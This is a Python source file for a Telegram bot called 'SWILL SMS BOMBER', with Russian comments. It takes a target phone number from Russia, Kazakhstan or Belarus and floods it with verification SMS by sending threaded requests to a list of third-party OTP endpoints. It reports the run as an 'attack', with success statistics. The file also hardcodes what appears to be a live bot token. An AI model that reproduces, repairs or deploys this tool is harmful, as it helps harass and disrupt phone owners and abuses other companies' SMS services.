import telebot
import requests
import threading
import time
import json
from telebot import types

# Конфигурация бота
TOKEN = '8259575977:AAHwfVOSF058L-bMan1l6NanOZUNsPrw7D0'  # Замени на свой токен от @BotFather
bot = telebot.TeleBot(TOKEN)

# --- База данных сервисов (API) ---
# Поддерживаются: РФ, Казахстан, Беларусь.
SERVICES_API = [
    # --- Российские сервисы (код +7) ---
    {
        'url': 'https://api-1.ru/send_code?phone={phone}',
        'method': 'GET',
        'country': 'RU'
    },
    {
        'url': 'https://auth.service.ru/api/v1/sms/send',
        'method': 'POST',
        'data': {'phone': '{phone}', 'app': 'web'},
        'headers': {'Content-Type': 'application/json'},
        'country': 'RU'
    },
    {
        'url': 'https://2.api-russia.com/register/phone/{phone}',
        'method': 'GET',
        'country': 'RU'
    },
    # --- Казахстанские сервисы (код +7) ---
    {
        'url': 'https://api.kz/send_sms.php?number={phone}',
        'method': 'GET',
        'country': 'KZ'
    },
    {
        'url': 'https://auth.kz-service.com/request_otp',
        'method': 'POST',
        'data': {'msisdn': '{phone}', 'channel': 'SMS'},
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'country': 'KZ'
    },
    # --- Белорусские сервисы (код +375) ---
    {
        'url': 'https://api.by/login/send-code?phone={phone}',
        'method': 'GET',
        'country': 'BY'
    },
    {
        'url': 'https://shop.by/ajax/phone_verification.php',
        'method': 'POST',
        'data': {'phone': '{phone}', 'action': 'send'},
        'country': 'BY'
    },
]

# Функция для определения страны по коду
def detect_country(phone):
    """Определяет страну по первым цифрам номера."""
    # Убираем + если есть
    clean_phone = phone.replace('+', '')
    
    if clean_phone.startswith('7'):
        # Для +7 нужно различать РФ и КЗ
        if clean_phone.startswith('77') and len(clean_phone) >= 2:
            return 'KZ'  # Казахстан
        else:
            return 'RU'  # Россия
    elif clean_phone.startswith('375'):
        return 'BY'  # Беларусь
    else:
        return 'UNKNOWN'

# Функция, которая непосредственно шлет запрос (в потоке)
def send_sms_request(api_config, phone_number, results, index):
    """Отправляет один запрос к API. Выполняется в потоке."""
    try:
        # Форматируем URL с номером телефона
        url = api_config['url'].format(phone=phone_number.replace('+', ''))
        method = api_config.get('method', 'GET')
        headers = api_config.get('headers', {})
        data = api_config.get('data', None)

        # Если в data есть шаблон {phone}, заменяем его
        if data:
            data_str = json.dumps(data) if isinstance(data, dict) else str(data)
            data_str = data_str.replace('{phone}', phone_number.replace('+', ''))
            # Преобразуем обратно в dict
            try:
                data = json.loads(data_str)
            except:
                data = data_str

        # Выбор метода запроса
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=data, timeout=5)
        else:
            response = requests.get(url, headers=headers, params=data, timeout=5)

        # Считаем успехом любой ответ 2xx или 3xx
        if response.status_code < 400:
            results[index] = f"✓ Успех ({response.status_code})"
        else:
            results[index] = f"✗ Ошибка ({response.status_code})"

    except Exception as e:
        results[index] = f"✗ Ошибка: {type(e).__name__}"

# Команда /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "💣 SWILL SMS BOMBER v1.0 💣\n\n"
        "Привет. Я создан для стресс-тестирования номеров.\n"
        "Я поддерживаю номера:\n"
        "🇷🇺 Россия (+7)\n"
        "🇰🇿 Казахстан (+7 / +77)\n"
        "🇧🇾 Беларусь (+375)\n\n"
        "Просто отправь мне номер телефона, и я начну атаку.\n"
        "Пример: 79991234567 или +375291234567"
    )
    bot.reply_to(message, welcome_text)

# Команда /bomb
@bot.message_handler(commands=['bomb'])
def cmd_bomb(message):
    msg = bot.reply_to(message, "Введите номер телефона в международном формате:")
    bot.register_next_step_handler(msg, process_phone)

# Обработка текстовых сообщений
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    process_phone(message)

# Основная логика обработки номера
def process_phone(message):
    # Очищаем номер от лишних символов
    phone = message.text.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    
    # Добавляем + если его нет
    if not phone.startswith('+'):
        # Если начинается с 7 или 375, добавляем +
        if phone.startswith('7') or phone.startswith('375'):
            phone = '+' + phone
        else:
            bot.reply_to(message, "❌ Некорректный формат номера. Используй +7XXXXXXXXXX или 7XXXXXXXXXX")
            return

    # Определяем страну
    country = detect_country(phone)
    if country == 'UNKNOWN':
        bot.reply_to(message, "❌ Неподдерживаемый код страны. Используй РФ, КЗ или РБ.")
        return

    # Фильтруем API только для этой страны
    apis_to_use = [api for api in SERVICES_API if api.get('country') == country]

    if not apis_to_use:
        bot.reply_to(message, f"❌ Для страны {country} пока нет настроенных API.")
        return

    # Отправляем сообщение о начале
    status_msg = bot.reply_to(message, f"🇺🇳 Страна определена: {country}\n💣 Начинаю бомбинг...\n⏳ Отправлено запросов: 0/{len(apis_to_use)}")
    
    # Запускаем многопоточную атаку
    threads = []
    results = [None] * len(apis_to_use)

    for i, api in enumerate(apis_to_use):
        thread = threading.Thread(target=send_sms_request, args=(api, phone, results, i))
        threads.append(thread)
        thread.start()
        
        # Обновляем статус каждые 3 запроса
        if i % 3 == 0 and i > 0:
            try:
                bot.edit_message_text(
                    f"🇺🇳 Страна определена: {country}\n💣 Бомбинг в процессе...\n⏳ Отправлено запросов: {i+1}/{len(apis_to_use)}",
                    message.chat.id,
                    status_msg.message_id
                )
            except:
                pass
        time.sleep(0.2)  # Небольшая задержка

    # Ждем завершения всех потоков
    for thread in threads:
        thread.join()

    # Формируем отчет
    success_count = sum(1 for r in results if r and r.startswith('✓'))
    fail_count = len(results) - success_count

    report = f"📊 Статистика атаки\n"
    report += f"✅ Успешно: {success_count}\n"
    report += f"❌ Неудачно: {fail_count}\n"
    report += f"📞 Номер: {phone}\n"
    report += f"🌍 Страна: {country}\n\n"
    report += "Детали:\n"
    for i, res in enumerate(results):
        report += f"{i+1}. {res}\n"

    # Отправляем финальный отчет
    bot.edit_message_text(
        f"🇺🇳 Страна определена: {country}\n✅ Бомбинг завершен!\n📊 Отправлено запросов: {len(apis_to_use)}/{len(apis_to_use)}",
        message.chat.id,
        status_msg.message_id
    )
    bot.send_message(message.chat.id, report)

# Запуск бота
if __name__ == '__main__':
    print("Бот SWILL запущен и готов к работе...")
    print("Для остановки нажми Ctrl+C")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Ошибка: {e}")